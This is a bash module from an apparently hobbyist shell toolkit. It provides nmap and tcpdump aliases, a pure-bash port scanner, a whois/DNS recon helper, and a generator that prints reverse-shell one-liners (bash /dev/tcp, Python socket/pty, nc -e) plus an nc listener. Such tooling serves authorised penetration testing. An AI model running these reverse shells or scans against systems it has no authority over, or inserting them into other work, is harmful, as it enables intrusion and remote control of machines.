#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════════╗
# ║  modules/hacking.sh  —  Hacking/recon tools & aliases       ║
# ╚══════════════════════════════════════════════════════════════╝

# ── Extra packages this module may install ────────────────────
GHOST_HACKING_PKGS=(nmap netcat-openbsd curl wget whois dnsutils)

# ── Aliases ───────────────────────────────────────────────────
alias scan='nmap -sV -T4'
alias portscan='nmap -p- --open -T4'
alias udpscan='nmap -sU -T4'
alias myip='curl -s ifconfig.me && echo'
alias localnet='ip -br a'
alias sniff='sudo tcpdump -i any -n'
alias webcheck='curl -sIL'
alias revshell_gen='_ghost_revshell_gen'
alias ports='ss -tulnp'
alias conns='ss -tnp'

# ── Quick port scanner (pure bash, no nmap needed) ────────────
ghost_portscan() {
  local host="${1:?Usage: ghost_portscan <host> [start_port] [end_port]}"
  local start="${2:-1}" end="${3:-1024}"
  local open=()

  printf "${GH_CYN}[SCAN]${GH_RST} Scanning %s ports %d–%d\n" "$host" "$start" "$end"

  local p
  for (( p=start; p<=end; p++ )); do
    ( echo >/dev/tcp/"$host"/"$p" ) 2>/dev/null && open+=("$p")
  done

  if (( ${#open[@]} == 0 )); then
    printf "${GH_YEL}No open ports found.${GH_RST}\n"
  else
    printf "${GH_GRN}Open ports:${GH_RST} %s\n" "${open[*]}"
  fi
}

# ── Reverse shell one-liner generator ─────────────────────────
_ghost_revshell_gen() {
  local ip="${1:?Usage: revshell_gen <ip> <port>}"
  local port="${2:?Usage: revshell_gen <ip> <port>}"

  printf '\n%b  ── Reverse Shell Templates ──%b\n\n' "${GH_CYN}${GH_BLD}" "${GH_RST}"
  printf '%bBash:%b    bash -i >& /dev/tcp/%s/%s 0>&1\n' "${GH_YEL}" "${GH_RST}" "$ip" "$port"
  printf '%bPython:%b  python3 -c "import os,pty,socket;s=socket.socket();s.connect(('\''%s'\'',%s));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('\''/bin/bash'\'')"\n' \
    "${GH_YEL}" "${GH_RST}" "$ip" "$port"
  printf '%bNC:%b      nc -e /bin/bash %s %s\n' "${GH_YEL}" "${GH_RST}" "$ip" "$port"
  printf '%bListener:%b nc -lvnp %s\n\n' "${GH_YEL}" "${GH_RST}" "$port"
}

# ── Recon helper ──────────────────────────────────────────────
ghost_recon() {
  local target="${1:?Usage: ghost_recon <domain|ip>}"
  printf '\n%b[RECON]%b Target: %b%s%b\n\n' \
    "${GH_CYN}${GH_BLD}" "${GH_RST}" "${GH_GRN}" "$target" "${GH_RST}"

  printf '%b  whois:%b\n'     "${GH_YEL}" "${GH_RST}"; whois "$target" 2>/dev/null | head -20
  printf '\n%b  DNS:%b\n'     "${GH_YEL}" "${GH_RST}"; dig +short "$target" 2>/dev/null
  printf '\n%b  Reverse:%b\n' "${GH_YEL}" "${GH_RST}"; dig +short -x "$target" 2>/dev/null
  printf '\n%b  HTTP headers:%b\n' "${GH_YEL}" "${GH_RST}"
  curl -sIL --max-time 5 "$target" 2>/dev/null | head -20
}

# ── Menu / help ───────────────────────────────────────────────
ghost_hacking_menu() {
  printf '\n%b  ── Ghost Hacking Module ──%b\n\n' "${GH_CYN}${GH_BLD}" "${GH_RST}"
  printf '  %-20s %s\n' "scan <host>"            "nmap service scan"
  printf '  %-20s %s\n' "portscan <host>"         "nmap all-ports scan"
  printf '  %-20s %s\n' "ghost_portscan <h> [s] [e]" "pure-bash port scan"
  printf '  %-20s %s\n' "ghost_recon <target>"    "whois + dns + headers"
  printf '  %-20s %s\n' "revshell_gen <ip> <port>" "reverse shell templates"
  printf '  %-20s %s\n' "myip"                    "external IP address"
  printf '  %-20s %s\n' "ports"                   "listening ports (ss)"
  printf '  %-20s %s\n' "conns"                   "active connections"
  printf '\n'
}
alias ghack='ghost_hacking_menu'

gh_ok "Hacking module loaded — type ${GH_MAG}ghack${GH_RST} for commands"
